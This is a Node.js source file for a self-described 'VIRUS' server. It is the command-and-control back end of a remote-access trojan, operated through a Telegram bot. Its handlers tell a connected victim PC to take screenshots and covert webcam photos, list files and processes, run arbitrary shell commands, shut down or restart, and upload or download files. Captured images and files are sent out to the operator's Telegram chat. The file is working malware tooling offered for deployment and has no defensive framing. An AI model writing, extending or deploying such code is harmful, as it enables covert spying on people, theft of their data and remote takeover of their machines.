// -------------------------------
//   VIRUS SERVER – FIXED VERSION
// -------------------------------

const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const multer = require("multer");
const fs = require("fs");
const fetch = require("node-fetch");
const path = require("path");
const http = require("http");
const WebSocket = require("ws");

const botToken = "YOUR_BOT_TOKEN"; // <-- REPLACE
const botApi = `https://api.telegram.org/bot${botToken}`;
const userId = YOUR_USER_ID; // <-- REPLACE

// -------------------------------
// Express + WebSocket Setup
// -------------------------------

const app = express();
const appServer = http.createServer(app);
const wss = new WebSocket.Server({ server: appServer });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// multer config
const upload = multer({ dest: "uploads/" });

// Track connected client
let connectedSocket = null;

// -------------------------------
// WebSocket Connection Handling
// -------------------------------

wss.on("connection", (ws) => {
    connectedSocket = ws;

    console.log("A desktop client connected");

    botNotify("🟢 Desktop client connected.");

    ws.send(JSON.stringify({
        type: "status",
        message: "connected"
    }));

    ws.on("close", () => {
        connectedSocket = null;
        console.log("Client disconnected");
        botNotify("🔴 Desktop client disconnected.");
    });

    ws.on("message", (msg) => {
        handleDesktopMessage(msg.toString());
    });
});

// -------------------------------
// Helper: Send message to Telegram
// -------------------------------

async function botNotify(text, extra = {}) {
    try {
        await axios.post(`${botApi}/sendMessage`, {
            chat_id: userId,
            text,
            parse_mode: "HTML",
            ...extra
        });
    } catch (err) {
        console.error("Telegram send error:", err.message);
    }
}

// Helper: Send file to Telegram
async function sendFileToTelegram(filePath, caption = "") {
    try {
        const form = new FormData();
        form.append("chat_id", userId);
        form.append("document", fs.createReadStream(filePath));
        form.append("caption", caption);

        await fetch(`${botApi}/sendDocument`, {
            method: "POST",
            body: form
        });
    } catch (err) {
        console.error("File send error:", err.message);
    }
}

// -------------------------------
// Telegram Webhook Handler
// -------------------------------

app.post(`/webhook/${botToken}`, async (req, res) => {
    res.sendStatus(200);

    const body = req.body;

    // text message
    if (body.message && body.message.text) {
        const msg = body.message.text;
        await handleTelegramCommand(msg);
    }

    // file upload
    if (body.message && body.message.document) {
        await handleTelegramFile(body.message.document.file_id);
    }

    // callback buttons
    if (body.callback_query) {
        await handleCallback(body.callback_query.data);
    }
});

// -------------------------------
// Handle Telegram Commands
// -------------------------------

async function handleTelegramCommand(text) {
    const cmd = text.trim().toLowerCase();

    // No PC connected
    if (!connectedSocket) {
        botNotify("⚠️ No client is connected. Please start your desktop program.");
        return;
    }

    switch (cmd) {
        case "/start":
            botNotify("💻 VIRUS • PC Controller Online.\n\nChoose a command:");
            break;

        case "/screen":
            connectedSocket.send(JSON.stringify({ type: "screenshot" }));
            botNotify("📸 Taking screenshot…");
            break;

        case "/cam":
            connectedSocket.send(JSON.stringify({ type: "camera" }));
            botNotify("📷 Taking webcam photo…");
            break;

        case "/files":
            connectedSocket.send(JSON.stringify({ type: "list_files" }));
            botNotify("📂 Reading file system…");
            break;

        case "/process":
            connectedSocket.send(JSON.stringify({ type: "process_list" }));
            botNotify("⚙ Fetching running processes…");
            break;

        case "/shutdown":
            connectedSocket.send(JSON.stringify({ type: "shutdown" }));
            botNotify("🛑 Shutting down PC.");
            break;

        case "/restart":
            connectedSocket.send(JSON.stringify({ type: "restart" }));
            botNotify("🔄 Restarting PC.");
            break;

        default:
            // treat as shell command
            connectedSocket.send(JSON.stringify({
                type: "exec",
                command: text
            }));

            botNotify(`🖥 Executing command:\n<code>${text}</code>`);
    }
}

// -------------------------------
// Handle Incoming Files from Telegram
// -------------------------------

async function handleTelegramFile(fileId) {
    try {
        // Step 1: get file path
        const getPath = await axios.get(`${botApi}/getFile?file_id=${fileId}`);
        const filePath = getPath.data.result.file_path;

        // Step 2: download the file from Telegram
        const url = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
        const fileName = path.basename(filePath);
        const localPath = path.join("uploads", fileName);

        const response = await axios.get(url, { responseType: "arraybuffer" });
        fs.writeFileSync(localPath, response.data);

        botNotify("📁 File received. Sending to PC …");

        // Step 3: send to desktop client
        if (connectedSocket) {
            connectedSocket.send(JSON.stringify({
                type: "file_upload",
                fileName
            }));

            connectedSocket.send(response.data);
        }
    } catch (err) {
        console.error(err);
        botNotify("⚠️ File download failed.");
    }
}

// -------------------------------
// Handle Button Callbacks
// -------------------------------

async function handleCallback(data) {
    if (!connectedSocket) return botNotify("❌ No client connected.");

    connectedSocket.send(JSON.stringify({ type: data }));
    botNotify(`▶ Executing: ${data}`);
}

// -------------------------------
// Handle Data FROM the Desktop
// -------------------------------

async function handleDesktopMessage(msg) {
    try {
        const data = JSON.parse(msg);

        switch (data.type) {
            case "text":
                botNotify(`💬 From PC:\n${data.text}`);
                break;

            case "screenshot":
                fs.writeFileSync("screen.jpg", Buffer.from(data.buffer, "base64"));
                await sendFileToTelegram("screen.jpg", "🖼 Screenshot");
                break;

            case "camera":
                fs.writeFileSync("cam.jpg", Buffer.from(data.buffer, "base64"));
                await sendFileToTelegram("cam.jpg", "📷 Webcam Photo");
                break;

            case "file_list":
                botNotify("📂 File List:\n" + data.content.join("\n"));
                break;

            case "process_list":
                botNotify("⚙ Running Processes:\n" + data.content.join("\n"));
                break;

            case "file":
                fs.writeFileSync(`file_${Date.now()}`, Buffer.from(data.data, "base64"));
                botNotify("📥 Received file from PC.");
                break;

            default:
                console.log("Unknown PC message:", msg);
                break;
        }

    } catch (err) {
        console.error("Message parse error:", err.message, msg);
    }
}

// -------------------------------
// Start Server (Required for Render)
// -------------------------------

const PORT = process.env.PORT || 3000;

appServer.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
